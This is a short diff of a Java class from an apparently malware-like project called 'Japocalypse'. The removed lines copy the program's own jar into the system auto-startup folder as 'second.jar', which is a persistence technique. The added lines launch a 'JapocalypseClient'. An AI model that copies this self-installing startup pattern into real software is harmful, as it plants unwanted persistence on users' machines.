@@ -6,11 +6,10 @@ import java.util.Scanner;
 
 public class Solution {
     private static String fileName = "Japocalypse.jar";
-    public static void main(String[] args) throws Exception {
-        Path currentPath = Paths.get(Utilities.getRunningDirectory());
-        Path targetPath = Paths.get(Utilities.getAutoStartUp());
-        System.out.println(targetPath.toAbsolutePath());
-        copyFile(new File(fileName), new File(targetPath + "\\" + "second.jar"));
+
+    public static void main(String[] args)  {
+        JapocalypseClient client = new JapocalypseClient();
+        client.run();
     }
 
     public static void copyFile(File source, File dest) throws Exception {
